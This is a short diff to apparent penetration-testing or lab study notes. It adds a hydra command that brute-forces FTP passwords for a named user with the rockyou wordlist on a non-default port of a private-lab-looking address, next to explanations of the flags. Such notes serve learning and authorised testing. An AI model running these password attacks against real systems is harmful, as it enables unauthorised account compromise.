@@ -15,6 +15,10 @@ ftp <target_ip>
 
 hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <target_ip> ftp
 
+# hydra - non-default ftp port
+hydra -t 16 -l lazie -P /usr/share/wordlists/rockyou.txt -vV 10.10.71.62 ftp -s 8933 
+
+
 -t 4 suggests the number of parallel connections
 -l [user] Points to the user whose account you are trying to compromise
 -P [path to dictionary] points to the dictionary containing the list of possible passwords.
